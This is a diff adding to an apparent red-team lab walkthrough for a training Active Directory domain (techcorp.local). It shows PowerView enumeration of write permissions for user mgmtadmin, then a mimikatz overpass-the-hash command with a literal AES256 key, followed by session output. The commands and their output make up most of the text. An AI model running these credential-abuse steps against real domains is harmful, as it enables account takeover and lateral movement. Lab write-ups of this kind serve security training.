@@ -289,7 +289,72 @@ mimikatz #
 
 ```
 ## Write Permissions
+Looking for acls for the new user mgmtadmin:
+```
+PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
+PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
+distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
+distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
+distinguishedname with Convert-ADName
+
+
+ObjectDN                : CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1115
+IdentityReferenceName   : mgmtadmin
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceDN     : CN=mgmtadmin,CN=Users,DC=us,DC=techcorp,DC=local
+IdentityReferenceClass  : user
+
+
+
+```
 
 ## Abuse Permissions
+Create new impersonate session with pass the hash using the aes256 mgmtadmin credentials:
+```
+mimikatz # sekurlsa::opassth /domain:us.techcorp.local /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe
+user    : mgmtadmin
+domain  : us.techcorp.local
+program : cmd.exe
+impers. : no
+AES256  : 32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
+  |  PID  6096
+  |  TID  5624
+  |  LSA Process is now R/W
+  |  LUID 0 ; 26587766 (00000000:0195b276)
+  \_ msv1_0   - data copy @ 000002325CCE33B0 : OK !
+  \_ kerberos - data copy @ 000002325D06D6B8
+   \_ aes256_hmac       OK
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       -> null
+   \_ rc4_hmac_old      -> null
+   \_ rc4_md4           -> null
+   \_ rc4_hmac_nt_exp   -> null
+   \_ rc4_hmac_old_exp  -> null
+   \_ *Password replace @ 000002325C6E55B8 (32) -> null
 
+```
+```
+C:\Windows\system32>whoami
+us\studentuser17
+
+C:\Windows\system32>kalist
+'kalist' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>klist
+
+Current LogonId is 0:0x195b276
+
+Cached Tickets: (0)
+```
 ## Extract Secrets
